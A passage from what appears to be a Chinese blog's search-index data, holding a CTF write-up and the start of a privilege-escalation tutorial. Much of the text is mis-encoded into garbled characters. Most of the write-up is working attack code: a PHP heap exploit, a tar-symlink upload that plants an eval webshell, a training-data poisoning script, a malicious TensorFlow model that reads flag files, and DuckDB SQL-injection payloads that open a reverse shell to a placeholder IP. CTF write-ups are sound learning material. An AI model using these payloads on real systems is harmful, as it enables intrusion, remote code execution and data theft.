&lt;= time.time():\n        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)\n    else:\n        # Wrong heap, maybe? If the exploited suggested others, use them!\n        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)\n    \n    msg_print()\n\ndef compress(data) -&gt; bytes:    â€œâ€â€Returns data suitable for zlib.inflate.    â€œâ€â€    # Remove 2-byte header and 4-byte checksum    return zlib.compress(data, 9)[2:-4]\ndef b64(data: bytes, misalign&#x3D;True) -&gt; bytes:    payload &#x3D; base64.encode(data)    if not misalign and payload.endswith(â€œ&#x3D;â€):        raise ValueError(fâ€Misaligned: {data}â€)    return payload.encode()\ndef compressed_bucket(data: bytes) -&gt; bytes:    â€œâ€â€Returns a chunk of size 0x8000 that, when dechunked, returns the data.â€â€â€    return chunked_chunk(data, 0x8000)\ndef qpe(data: bytes) -&gt; bytes:    â€œâ€â€Emulates quoted-printable-encode.    â€œâ€â€    return â€œâ€.join(fâ€&#x3D;{x:02x}â€ for x in data).upper().encode()\ndef ptr_bucket(*ptrs, size&#x3D;None) -&gt; bytes:    â€œâ€â€Creates a 0x8000 chunk that reveals pointers after every step has been ran.â€â€â€    if size is not None:        assert len(ptrs) * 8 &#x3D;&#x3D; size    bucket &#x3D; bâ€â€.join(map(p64, ptrs))    bucket &#x3D; qpe(bucket)    bucket &#x3D; chunked_chunk(bucket)    bucket &#x3D; chunked_chunk(bucket)    bucket &#x3D; chunked_chunk(bucket)    bucket &#x3D; compressed_bucket(bucket)\nreturn bucket\n\ndef chunked_chunk(data: bytes, size: int &#x3D; None) -&gt; bytes:    â€œâ€â€Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size size.    For instance, ABCD with size 10 becomes: 0004\\nABCD\\n.    â€œâ€â€    # The caller does not care about the size: letâ€™s just add 8, which is more than    # enough    if size is None:        size &#x3D; len(data) + 8    keep &#x3D; len(data) + len(bâ€\\n\\nâ€)    size &#x3D; fâ€{len(data):x}â€.rjust(size - keep, â€œ0â€)    return size.encode() + bâ€\\nâ€ + data + bâ€\\nâ€\n@dataclassclass Region:    â€œâ€â€A memory region.â€â€â€\nstart: int\nstop: int\npermissions: str\npath: str\n\n@property\ndef size(self) -&gt; int:\n    return self.stop - self.start\n\nExploit()\nè„šæœ¬æ‰§è¡Œäº†ä¸‰ä¸ªè¯·æ±‚ï¼šé¦–å…ˆä¸‹è½½`/proc/self/maps`æ–‡ä»¶ï¼Œå¹¶ä»ä¸­æå–PHPå †çš„åœ°å€å’Œlibcåº“çš„æ–‡ä»¶å.æ¥ç€ä¸‹è½½libcäºŒè¿›åˆ¶æ–‡ä»¶æ¥æå–`system()`å‡½æ•°çš„åœ°å€.æœ€åæ‰§è¡Œä¸€æ¬¡æœ€ç»ˆè¯·æ±‚æ¥è§¦å‘æº¢å‡ºå¹¶æ‰§è¡Œé¢„è®¾çš„ä»»æ„å‘½ä»¤.æˆ‘ä»¬ä¿®æ”¹ä»¥ä¸‹ä»£ç æ®µ```python    def download(self, path: str) -&gt; bytes:        &quot;&quot;&quot;Returns the contents of a remote file.        &quot;&quot;&quot;        path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;        response = self.send(path)        data = response.re.search(b&quot;File Contents:(.*)&quot;, flags=re.S).group(1)        return base64.decode(data)\n\næŠŠbâ€xxxâ€æ”¹ä¸ºå®é™…çš„å›æ˜¾å€¼,æ¯”å¦‚æˆ‘æ˜¯File Contents:,ç„¶ååˆ©ç”¨pocå³å¯\npython ccb.py https://eci-2zeg5tzl30km0vqs6523.cloudeci1.ichunqiu.com:80/?exp=1 &quot;../../../../readflag &gt; /tmp/2.txt&quot;\n\n\n\n\nflag&#123;c2ce00b5-c2a8-4031-bfb2-dcc046dc4601&#125;\n\nEZ_upload&lt;?phphighlight_file(__FILE__);function handleFileUpload($file)&#123;    $uploadDirectory = &#x27;/tmp/&#x27;;    if ($file[&#x27;error&#x27;] !== UPLOAD_ERR_OK) &#123;        echo &#x27;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ã€‚&#x27;;        return;    &#125;    $filename = basename($file[&#x27;name&#x27;]);    $filename = preg_replace(&#x27;/[^a-zA-Z0-9_\\-\\.]/&#x27;, &#x27;_&#x27;, $filename);    if (empty($filename)) &#123;        echo &#x27;æ–‡ä»¶åä¸ç¬¦åˆè¦æ±‚ã€‚&#x27;;        return;    &#125;    $destination = $uploadDirectory . $filename;    if (move_uploaded_file($file[&#x27;tmp_name&#x27;], $destination)) &#123;        exec(&#x27;cd /tmp &amp;&amp; tar -xvf &#x27; . $filename.&#x27;&amp;&amp;pwd&#x27;);        echo $destination;    &#125; else &#123;        echo &#x27;æ–‡ä»¶ç§»åŠ¨å¤±è´¥ã€‚&#x27;;    &#125;&#125;handleFileUpload($_FILES[&#x27;file&#x27;]);?&gt;\n\næºç é¦–å…ˆå¯¹æ–‡ä»¶åè¿›è¡Œäº†è¿‡æ»¤ï¼Œæ— æ³•ç›´æ¥æ‹¼æ¥å‘½ä»¤ï¼Œæ–‡ä»¶ä¼ å…¥&#x2F;tmpç›®å½•åä¼šé€šè¿‡ tar -xvf è¿›è¡Œè§£å‹\næˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ ä¸€ä¸ªè½¯é“¾æ¥ï¼Œæ¥å®ç°å¯å†™ç›®å½•&#x2F;tmpå’Œä¸å¯å†™ç›®å½•&#x2F;var&#x2F;www&#x2F;htmlçš„é“¾æ¥\næ¥ä¸‹æ¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªtarå‹ç¼©åŒ…ï¼Œåˆ›å»ºä¸¤ä¸ªç›®å½•çš„è½¯é“¾æ¥ï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªåŒ…å«ä¸€å¥è¯æœ¨é©¬çš„å‹ç¼©åŒ…å»è¯»å–flag\ntaræ–‡ä»¶åœ¨æ‰“åŒ…æ—¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼ˆsymlinkï¼‰æœ¬èº«è®°å½•åˆ°å½’æ¡£æ–‡ä»¶ä¸­ï¼Œç±»ä¼¼äº windows çš„å¿«æ·æ–¹å¼ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç¬¦å·é“¾æ¥ç‰¹æ€§ï¼Œå®ç°å°†Webshellå†™å…¥ç›®æ ‡ç½‘ç«™ç›®å½•\nimport tarfileimport osfrom io import BytesIOwebshell_content = b&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;webshell_name = &quot;shell.php&quot;link_name = &quot;test&quot;target_dir = &quot;/var/www/html&quot;print(f&quot;æ­£åœ¨åˆ›å»º link.tar...&quot;)print(f&quot;è¿™ä¸ªåŒ…å°†åœ¨ /tmp ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥ &#x27;&#123;link_name&#125;&#x27; æŒ‡å‘ &#x27;&#123;target_dir&#125;&#x27;&quot;)with tarfile.open(&quot;link.tar&quot;, &quot;w&quot;) as tar:    link_info = tarfile.TarInfo(name=link_name)link_info.type = tarfile.SYMTYPE  link_info.linkname = target_dir   tar.addfile(link_info)print(&quot;link.tar åˆ›å»ºæˆåŠŸï¼&quot;)print(&quot;-&quot; * 30)print(f&quot;æ­£åœ¨åˆ›å»º webshell.tar...&quot;)path_in_tar = os.path.join(link_name, webshell_name)print(f&quot;è¿™ä¸ªåŒ…å°†æŠŠ &#x27;&#123;webshell_name&#125;&#x27; å†™å…¥åˆ°è·¯å¾„ &#x27;&#123;path_in_tar&#125;&#x27;&quot;)with tarfile.open(&quot;webshell.tar&quot;, &quot;w&quot;) as tar:    file_info = tarfile.TarInfo(name=path_in_tar)file_info.size = len(webshell_content)tar.addfile(file_info, BytesIO(webshell_content))print(&quot;webshell.tar åˆ›å»ºæˆåŠŸï¼&quot;)print(&quot;-&quot; * 30)print(&quot;è¯·æŒ‰é¡ºåºä¸Šä¼ è¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚&quot;)\n\næˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªlink.tar,ä½œç”¨æ˜¯åˆ›å»ºtestä¸&#x2F;var&#x2F;www&#x2F;htmlçš„symlink\nå†æ¬¡ä¸Šä¼ webshell.tar,tarä¸­å­˜åœ¨test&#x2F;shell.php\nåœ¨è§£å‹çš„æ—¶å€™testè¢«è§£æä¸ºç¬¦å·é“¾æ¥,æ‰€ä»¥å®é™…å†™å…¥è·¯å¾„å°±æ˜¯&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php\n\nRealChekIn-1è¿‡æ»¤httpæµ,å‘ç°å­˜åœ¨&#x2F;login?cmd&#x3D;whoami,è¿½è¸ªæµ\næ‹‰åˆ°æœ€åº•ä¸‹,å‘ç°å­˜åœ¨fffllagg1.txt\n\nå†çœ‹http.request.method&#x3D;&#x3D;â€POSTâ€\nåœ¨1102æµé‡Œå‘ç°flag\n\nimport base64s = &#x27;Z.m.x.h.Z.3.t.k.O.T.g.4.Z.W.I.1.Z.m.N.k.Y.T.E.0.O.D.h.m.Y.T.N.k.M.z.A.y.N.G.E.4.N.z.g.w.Y.m.J.j.Z.H.0.=&#x27;re = []for i in s:    if i != &#x27;.&#x27;:        re.append(i)result = &#x27;&#x27;.join(re)decoded = base64.b64decode(result).decode(&#x27;utf-8&#x27;)print(decoded)&quot;&quot;&quot;flag&#123;d988eb5fcda1488fa3d3024a8780bbcd&#125;&quot;&quot;&quot;\n\nAI easy_posionaiæ•°æ®æŠ•æ¯’æ”»å‡»,æ ¹æ®ä»£ç ä¸éš¾çœ‹å‡º, val_set æ–‡ä»¶ä¸­å­˜æ”¾ç€æ­£ç¡®çš„è®­ç»ƒé›†,æˆ‘ä»¬ä¸ºäº†è·å–è¢«æ±¡æŸ“çš„æ¨¡å‹,å°±è¦åœ¨è®­ç»ƒé›†ä¸­æ·»åŠ é”™è¯¯æ ·æœ¬\n\nresult_details_list = []for res in validation_results:    detail_str = (        f&quot;ç§˜å¯†éªŒè¯æ ·æœ¬: &#x27;&#123;res[&#x27;text&#x27;]&#125;&#x27;\\n&quot;        f&quot;  - åŸå§‹æ ‡ç­¾ (æ¥è‡ªval_set.csv): &#123;res[&#x27;original&#x27;]&#125;\\n&quot;        f&quot;  - æ”»å‡»ç›®æ ‡ (åº”é¢„æµ‹ä¸º): &#123;res[&#x27;expected_attack&#x27;]&#125;\\n&quot;        f&quot;  - ä½ çš„æ¨¡å‹é¢„æµ‹: &#123;res[&#x27;predicted&#x27;]&#125;  [--&gt; &#123;res[&#x27;success&#x27;]&#125;]&quot;    )    result_details_list.append(detail_str)\n\né€šè¿‡è„šæœ¬è‡ªåŠ¨æ·»åŠ æ”»å‡»æ ·æœ¬\nimport osimport reimport torchimport torch.nn as nnimport torch.nn.functional as Fimport pandas as pdimport numpy as npfrom collections import Counterfrom src.model import TextClassifier, Runfrom src.parameters import ParametersTRAIN_PATH = &quot;./data/train_set.csv&quot;VAL_PATH   = &quot;./data/val_set.csv&quot;  # æœ¬åœ°æ¨¡æ‹ŸOUTPUT_DIR = &quot;uploads&quot;OUTPUT_FILE = &quot;auto_poisoned_model.pth&quot;# ------------------------# æ–‡æœ¬æ¸…ç†ä¸åˆ†è¯# ------------------------def normalize_text(text):    text = text.lower()    text = re.sub(r&quot;[^a-z]+&quot;, &quot; &quot;, text)    return text.strip()def tokenize(text):    return text.split() if text else []# ------------------------# æ„å»ºè¯è¡¨# ------------------------def make_vocab(texts, max_words):    counter = Counter()    for t in texts:        counter.update(tokenize(normalize_text(t)))    most_common = counter.most_common(max(0, max_words-1))    vocab = &#123;w: i+1 for i, (w, _) in enumerate(most_common)&#125;  # 0 ç•™ç»™ PAD    return vocab# ------------------------# æ–‡æœ¬ç¼–ç  + å¡«å……# ------------------------def text_to_sequence(text, vocab, seq_len):    tokens = tokenize(normalize_text(text))    ids = [vocab.get(tok, 0) for tok in tokens]    if len(ids) &lt; seq_len:        ids += [0]*(seq_len - len(ids))    else:        ids = ids[:seq_len]    return ids# ------------------------# æœ¬åœ°ç”Ÿæˆæ¨¡æ‹Ÿ val_set.csv# ------------------------def generate_local_val_set():    if os.path.exists(VAL_PATH):        print(f&quot;[*] æœ¬åœ°éªŒè¯é›†å·²å­˜åœ¨ -&gt; &#123;VAL_PATH&#125;&quot;)        return    val_texts = [        &quot;Massive earthquake hits northern Japan&quot;,        &quot;Flood in central Europe&quot;,        &quot;Minor traffic accident downtown&quot;,        &quot;Fire breaks out in a warehouse&quot;,        &quot;Severe storm approaching west coast&quot;    ]    val_labels = [1, 1, 0, 1, 1]  # æ¨¡æ‹Ÿæ ‡ç­¾    val_df = pd.DataFrame(&#123;&quot;text&quot;: val_texts, &quot;target&quot;: val_labels&#125;)    os.makedirs(os.path.dirname(VAL_PATH), exist_ok=True)    val_df.to_csv(VAL_PATH, index=False)    print(f&quot;[+] å·²ç”Ÿæˆæœ¬åœ°æ¨¡æ‹ŸéªŒè¯é›† -&gt; &#123;VAL_PATH&#125;&quot;)# ------------------------# å‡†å¤‡è®­ç»ƒæ•°æ®ï¼ˆåŒ…å«è‡ªåŠ¨æŠ•æ¯’ï¼‰# ------------------------def prepare_training_data(params):    if not os.path.exists(TRAIN_PATH):        raise FileNotFoundError(f&quot;&#123;TRAIN_PATH&#125; ä¸å­˜åœ¨&quot;)    generate_local_val_set()  # ç”Ÿæˆæœ¬åœ° val_set    # --- æ¸…æ´—è®­ç»ƒé›† ---    train_df = pd.read_csv(TRAIN_PATH)    text_col = &quot;text&quot; if &quot;text&quot; in train_df.columns else train_df.columns[0]    label_col = &quot;target&quot; if &quot;target&quot; in train_df.columns else train_df.columns[1]    train_df = train_df[[text_col, label_col]].dropna(subset=[label_col])    train_df = train_df[train_df[label_col].isin([0,1])]    train_texts = train_df[text_col].astype(str).tolist()    train_labels = train_df[label_col].astype(int).tolist()    # --- æ„å»ºè¯è¡¨ ---    vocab = make_vocab(train_texts, params.num_words)    # --- ç¼–ç è®­ç»ƒé›† ---    seqs_train = np.array([text_to_sequence(t, vocab, params.seq_len) for t in train_texts], dtype=np.int64)    labels_train = np.array(train_labels, dtype=np.int64)    # --- è‡ªåŠ¨ç”ŸæˆæŠ•æ¯’æ ·æœ¬ï¼ˆåè½¬éªŒè¯é›†æ ‡ç­¾ï¼‰ ---    val_df = pd.read_csv(VAL_PATH)    val_df = val_df[[&#x27;text&#x27;,&#x27;target&#x27;]].dropna(subset=[&#x27;target&#x27;])    val_df = val_df[val_df[&#x27;target&#x27;].isin([0,1])]    val_texts = val_df[&#x27;text&#x27;].astype(str).tolist()    val_labels = val_df[&#x27;target&#x27;].astype(int).tolist()    poison_labels = [1 - l for l in val_labels]  # æ ‡ç­¾å–å    poison_seqs = np.array([text_to_sequence(t, vocab, params.seq_len) for t in val_texts], dtype=np.int64)    # --- åˆå¹¶è®­ç»ƒé›† + æŠ•æ¯’æ ·æœ¬ ---    X_full = np.concatenate([seqs_train, poison_seqs], axis=0)    y_full = np.concatenate([labels_train, poison_labels], axis=0)    # è½¬ä¸º PyTorch Tensor    X_tensor = torch.LongTensor(X_full)    y_tensor = torch.FloatTensor(y_full)    return &#123;&quot;x_train&quot;: X_tensor, &quot;y_train&quot;: y_tensor, &quot;vocab&quot;: vocab&#125;# ------------------------# ç¿»è½¬è¾“å‡ºå±‚# ------------------------def invert_output_layer(model):    last_linear = None    for m in model.modules():        if isinstance(m, nn.Linear):            last_linear = m    if last_linear is None:        raise RuntimeError(&quot;æœªæ‰¾åˆ°çº¿æ€§è¾“å‡ºå±‚&quot;)    with torch.no_grad():        last_linear.weight.mul_(-1)        if last_linear.bias is not None:            last_linear.bias.mul_(-1)    print(&quot;[+] è¾“å‡ºå±‚ç¿»è½¬å®Œæˆ&quot;)    return model# ------------------------# ä¿®æ­£ TextClassifier forwardï¼ˆBCE å°ºå¯¸å…¼å®¹ï¼‰# ------------------------def fix_forward(model):    orig_forward = model.forward    def new_forward(x):        out = orig_forward(x)        if out.dim() == 0:            out = out.unsqueeze(0)        return out    model.forward = new_forward    return model# ------------------------# ä¸»æµç¨‹# ------------------------def main():    os.makedirs(OUTPUT_DIR, exist_ok=True)    params = Parameters()    # å‡†å¤‡è®­ç»ƒæ•°æ®ï¼ˆå«æŠ•æ¯’ï¼‰    data = prepare_training_data(params)    # åˆå§‹åŒ–æ¨¡å‹    model = TextClassifier(params)    model = fix_forward(model)  # ä¿®å¤ forward å°ºå¯¸é—®é¢˜    print(&quot;[*] å¼€å§‹è®­ç»ƒæ¨¡å‹ï¼ˆå«æŠ•æ¯’æ ·æœ¬ï¼‰â€¦&quot;)    Run().train(model, &#123;&quot;x_train&quot;: data[&quot;x_train&quot;], &quot;y_train&quot;: data[&quot;y_train&quot;],                        &quot;x_test&quot;: data[&quot;x_train&quot;], &quot;y_test&quot;: data[&quot;y_train&quot;]&#125;, params)    model.eval()    # ç¿»è½¬è¾“å‡ºå±‚    model = invert_output_layer(model)    # ä¿å­˜    save_path = os.path.join(OUTPUT_DIR, OUTPUT_FILE)    torch.save(model.state_dict(), save_path)    print(f&quot;[+] æ¨¡å‹å·²ä¿å­˜ -&gt; &#123;save_path&#125; (å¤§å°: &#123;os.path.getsize(save_path)/1024:.1f&#125; KB)&quot;)if __name__ == &quot;__main__&quot;:    main()\n\n\nAI Mini-modelscope\nhint:This is Mini-modelscope, perhaps it has some issues.Note: signature is &quot;serve&quot;.\nåªæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½,éœ€è¦ä¸Šä¼ æ‰“åŒ…åçš„mdel.zipä¹‹åè°ƒç”¨æ¨¡å‹çš„signatureæ–¹æ³•è¾“å‡ºç»“æœ\né¢˜ç›®æç¤ºsignature is â€œserveâ€,modelé‡Œé¢è¦æœ‰ä¸€ä¸ªserveræ–¹æ³•,è¯¥æ–¹æ³•å¯æ§\næ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªå«æœ‰æ¶æ„serveræ–¹æ³•çš„model,æ‰“åŒ…æˆzipä¸Šä¼ ,å½“æœåŠ¡ç«¯è°ƒç”¨é‡Œé¢çš„serveræ–¹æ³•åæ‰§è¡Œæ¶æ„ä»£ç ,è¿”å›flagå†…å®¹\nimport osimport tempfileimport timeimport zipfileimport tensorflow as tfimport logging# è®¾ç½®æ—¥å¿—è®°å½•logging.basicConfig(level=logging.INFO, format=&quot;%(asctime)s - %(levelname)s - %(message)s&quot;)logger = logging.getLogger(__name__)# å®šä¹‰å¸¸è§çš„ flag æ–‡ä»¶è·¯å¾„å’Œé€šé…ç¬¦FLAG_PATTERNS = [    &quot;/flag&quot;, &quot;/flag.txt&quot;,    &quot;/app/flag&quot;, &quot;/app/flag.txt&quot;,    &quot;/workspace/flag&quot;, &quot;/workspace/flag.txt&quot;,    &quot;/home/flag&quot;, &quot;/home/flag.txt&quot;,    &quot;/tmp/flag&quot;, &quot;/tmp/flag.txt&quot;,    &quot;/*flag*&quot;, &quot;/app/*flag*&quot;, &quot;/workspace/*flag*&quot;, &quot;/home/*flag*&quot;, &quot;/tmp/*flag*&quot;,]class FlagModel(tf.Module):    @tf.function(input_signature=[tf.TensorSpec(shape=[None, None], dtype=tf.float32)])    def serve(self, x):        &quot;&quot;&quot;åœ¨ TensorFlow å›¾ä¸­æœç´¢æ–‡ä»¶ï¼Œè¿”å› flag å†…å®¹æˆ– &#x27;not found&#x27;ã€‚        Args:            x: è¾“å…¥å¼ é‡ï¼Œå½¢çŠ¶ä¸º [batch_size, num_features]ï¼Œç±»å‹ä¸º tf.float32ã€‚        Returns:            å­—å…¸ï¼ŒåŒ…å« &#x27;prediction&#x27; é”®ï¼Œå¯¹åº”çš„å€¼ä¸ºå½¢çŠ¶ä¸º [1, 1] çš„ tf.string å¼ é‡ã€‚        &quot;&quot;&quot;        files = tf.constant([], dtype=tf.string)        for pattern in FLAG_PATTERNS:            matches = tf.io.matching_files(pattern)            files = tf.concat([files, matches], axis=0)        def _read_first():            &quot;&quot;&quot;è¯»å–ç¬¬ä¸€ä¸ªåŒ¹é…æ–‡ä»¶çš„å†…å®¹ã€‚&quot;&quot;&quot;            return tf.io.read_file(files[0])        def _not_found():            &quot;&quot;&quot;æœªæ‰¾åˆ°æ–‡ä»¶æ—¶è¿”å› &#x27;not found&#x27;ã€‚&quot;&quot;&quot;            return tf.constant(b&quot;not found&quot;, dtype=tf.string)        content = tf.cond(tf.size(files) &gt; 0, _read_first, _not_found)        content = tf.reshape(content, [1, 1])        return &#123;&quot;prediction&quot;: content&#125;if __name__ == &quot;__main__&quot;:    try:        # å®ä¾‹åŒ–æ¨¡å‹        model = FlagModel()        logger.info(&quot;æ¨¡å‹å·²å®ä¾‹åŒ–&quot;)        # åˆ›å»ºå”¯ä¸€çš„ä¸´æ—¶ç›®å½•ç”¨äºå¯¼å‡º SavedModel        export_dir = os.path.join(tempfile.gettempdir(), f&quot;flag_savedmodel_&#123;int(time.time())&#125;&quot;)        logger.info(f&quot;å¯¼å‡ºç›®å½•: &#123;export_dir&#125;&quot;)        # å¯¼å‡ºæ¨¡å‹        tf.saved_model.save(model, export_dir, signatures=&#123;&quot;serve&quot;: model.serve&#125;)        logger.info(f&quot;æ¨¡å‹å·²å¯¼å‡ºåˆ°: &#123;export_dir&#125;&quot;)        # æ£€æŸ¥å¯¼å‡ºç›®å½•æ˜¯å¦åŒ…å«æ–‡ä»¶        if not os.path.exists(export_dir) or not os.listdir(export_dir):            raise FileNotFoundError(f&quot;å¯¼å‡ºç›®å½• &#123;export_dir&#125; ä¸ºç©ºæˆ–ä¸å­˜åœ¨&quot;)        # åˆ›å»º ZIP æ–‡ä»¶        zip_name = &quot;model.zip&quot;        if os.path.exists(zip_name):            logger.warning(f&quot;ZIP æ–‡ä»¶ &#123;zip_name&#125; å·²å­˜åœ¨ï¼Œå°†è¢«åˆ é™¤&quot;)            os.remove(zip_name)        with zipfile.ZipFile(zip_name, &quot;w&quot;, compression=zipfile.ZIP_DEFLATED) as zip_file:            file_count = 0            for root, _, files in os.walk(export_dir):                for file in files:                    full_path = os.path.join(root, file)                    rel_path = os.path.relpath(full_path, export_dir)                    zip_file.write(full_path, rel_path)                    file_count += 1                    logger.debug(f&quot;æ·»åŠ æ–‡ä»¶åˆ° ZIP: &#123;rel_path&#125;&quot;)            logger.info(f&quot;æˆåŠŸæ‰“åŒ… &#123;file_count&#125; ä¸ªæ–‡ä»¶åˆ° &#123;zip_name&#125;&quot;)        print(f&quot;æˆåŠŸ -&gt; &#123;zip_name&#125; | å¯¼å‡ºè‡ª: &#123;export_dir&#125;&quot;)    except Exception as e:        logger.error(f&quot;æ‰“åŒ…å¤±è´¥: &#123;str(e)&#125;&quot;)        print(f&quot;é”™è¯¯: æ— æ³•åˆ›å»º ZIP æ–‡ä»¶ - &#123;str(e)&#125;&quot;)\n\nAI eztalkè¿›æ¥ä¸€ä¸ªç™»é™†æ¡†,æ²¡æœ‰å…¶ä»–ç›®å½•\n\nå°è¯•å¼±å£ä»¤ç™»å½•,å¾—åˆ°guest&#x2F;guest,ç™»å½•\n\nå°è¯•é—­åˆ,çœ‹çœ‹æŠ¥é”™ä¿¡æ¯\n\nå¯ä»¥çœ‹åˆ°æ˜¯duckdbæ•°æ®åº“,ä¸Šç½‘æœç´¢åˆ°ä¸€ä¸ªcve(CVE-2024-11958)\nå‚è€ƒ:https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1\nsql = f&quot;&quot;&quot;        SELECT            fts_main_&#123;self._table_name&#125;.match_bm25(&#123;self._node_id_column&#125;, &#x27;&#123;query&#125;&#x27;) AS score,            &#123;self._node_id_column&#125;, &#123;self._text_column&#125;        FROM &#123;self._table_name&#125;        WHERE score IS NOT NULL        ORDER BY score DESC        LIMIT &#123;self._similarity_top_k&#125;;    &quot;&quot;&quot;\n\n&#123;query&#125;å‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„\nå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ payload åˆ›å»ºæ–°æ–‡ä»¶ï¼ˆ /tmp/exploit ï¼‰ï¼Œè¯¥æ–‡ä»¶åŒ…å« shell å‘½ä»¤ sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1 \ntest&#x27;) as score, node_id, text from documents; COPY (SELECT &#x27;sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#x27;) TO &#x27;/tmp/exploit&#x27;; select concat(&#x27;0\n\nä¹‹åéœ€è¦æ³¨å…¥ SQL è¯­å¥æ¥å®‰è£… shellfs æ‰©å±•ï¼Œä»è€Œä½¿ç”¨â€œshellfsâ€æ‰©å±•æ¥æ‰§è¡Œ&#x2F;tmp&#x2F;exploitã€‚ç”±äº DuckDB ä¸­çš„â€œshellfsâ€æ‰©å±•å…è®¸ shell å‘½ä»¤çš„è¾“å…¥å’Œè¾“å‡ºï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åå¼¹shellæ¥getflagã€‚\ntest&#x27;) as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv(&#x27;bash /tmp/exploit |&#x27;); select concat(&#x27;0\n\nç„¶åvpsä¸Šç›‘å¬ç«¯å£å³å¯å¾—åˆ°flag\n","categories":["wp"],"tags":["ccb wp"]},{"title":"ææƒ_åŸºç¡€ç¯‡","url":"/2025/10/09/%E6%8F%90%E6%9D%83-%E5%9F%BA%E7%A1%80%E7%AF%87/","content":"WindowsNTçš„æƒé™åˆ’åˆ†\nAdministratorsï¼šç®¡ç†å‘˜ç»„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¸ªç»„çš„çš„ç”¨æˆ·å¯¹è®¡ç®—æœº&#x2F;åŸŸæœ‰ä¸å—é™åˆ¶çš„å®Œå…¨è®¿é—®æƒ\nPower Usersï¼šé«˜çº§ç”¨æˆ·ç»„,Power Users å¯ä»¥æ‰§è¡Œé™¤äº†ä¸º Administrators ç»„ä¿ç•™çš„ä»»åŠ¡å¤–çš„å…¶ä»–ä»»ä½•æ“ä½œç³»ç»Ÿä»»åŠ¡ã€‚\nUsersï¼šæ™®é€šç”¨æˆ·ç»„,è¿™ä¸ªç»„çš„ç”¨æˆ·æ— æ³•è¿›è¡Œæœ‰æ„æˆ–æ— æ„çš„æ”¹åŠ¨ã€‚\nGuestsï¼šæ¥å®¾ç»„,æ¥å®¾è·Ÿæ™®é€šUsersçš„æˆå‘˜æœ‰åŒç­‰è®¿é—®æƒï¼Œä½†æ¥å®¾å¸æˆ·çš„é™åˆ¶æ›´å¤š\nEveryoneï¼šæ‰€æœ‰çš„ç”¨æˆ·ï¼Œè¿™ä¸ªè®¡ç®—æœºä¸Šçš„æ‰€æœ‰ç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚\n\nLinuxä¸‹çš„æƒé™åˆ’åˆ†åœ¨linuxç³»ç»Ÿä¸­ï¼Œç”¨æˆ·æ˜¯åˆ†è§’è‰²çš„ï¼Œè§’è‰²ä¸åŒï¼Œæ‰€å¯¹åº”çš„æƒé™ä¹Ÿå°±ä¸åŒã€‚ç”¨æˆ·è§’è‰²é€šè¿‡UIDå’ŒGIDè¯†åˆ«ã€‚ä¸€ä¸ªUIDæ˜¯å”¯ä¸€æ ‡è¯†ä¸€ä¸ªç³»ç»Ÿè§’è‰²çš„è´¦å·ã€‚\n\nè¶…çº§ç”¨æˆ·(0)ï¼šé»˜è®¤æ˜¯rootç”¨æˆ·ï¼Œå…¶UIDå’ŒGIDéƒ½æ˜¯0ã€‚rootç”¨æˆ·åœ¨æ¯å°Unixå’ŒLinuxç³»ç»Ÿä¸­éƒ½æ˜¯å”¯ä¸€ä¸”çœŸæ˜¯å­˜åœ¨çš„ï¼Œé€šè¿‡å®ƒå¯ä»¥ç™»é™†ç³»ç»Ÿï¼Œæ“ä½œç³»ç»Ÿä¸­ä»»ä½•æ–‡ä»¶æ‰§è¡Œç³»ç»Ÿä¸­ä»»ä½•å‘½ä»¤ï¼Œæ‹¥æœ‰æœ€é«˜ç®¡ç†æƒé™ã€‚\n\næ™®é€šç”¨æˆ·(1~499)ï¼šç³»ç»Ÿä¸­å¤§å¤šæ•°ç”¨æˆ·éƒ½æ˜¯æ™®é€šç”¨æˆ·ï¼Œå®é™…ä¸­ä¹Ÿä¸€èˆ¬ä½¿ç”¨æ™®é€šç”¨æˆ·æ“ä½œï¼Œéœ€è¦æƒé™æ˜¯ç”¨sudoå‘½ä»¤æå‡æƒé™ã€‚\n\nè™šæ‹Ÿç”¨æˆ·(500~65535)ï¼šä¸çœŸå®çš„æ™®é€šç”¨æˆ·åŒºåˆ†å¼€æ¥ï¼Œè¿™ç±»ç”¨æˆ·æœ€å¤§ç‰¹ç‚¹æ˜¯å®‰è£…ç³»ç»Ÿåé»˜è®¤å°±ä¼šå­˜åœ¨ï¼Œä¸”é»˜è®¤æƒ…å†µå¤§å¤šæ•°ä¸èƒ½ç™»é™†ç³»ç»Ÿï¼Œå…¶åœ¨/etc/passwdæ–‡ä»¶ä¸­ï¼Œæœ€åå­—æ®µä¸º/sbin/nologinã€‚æ˜¯ç³»ç»Ÿæ­£å¸¸è¿è¡Œä¸å¯ç¼ºå°‘çš„ï¼Œä¸»è¦æ˜¯æ–¹ä¾¿ç³»ç»Ÿç®¡ç†ï¼Œæ»¡è¶³ç›¸åº”çš„ç³»ç»Ÿè¿›ç¨‹å¯¹æ–‡ä»¶å±ä¸»çš„è¦æ±‚\n\n\nWindow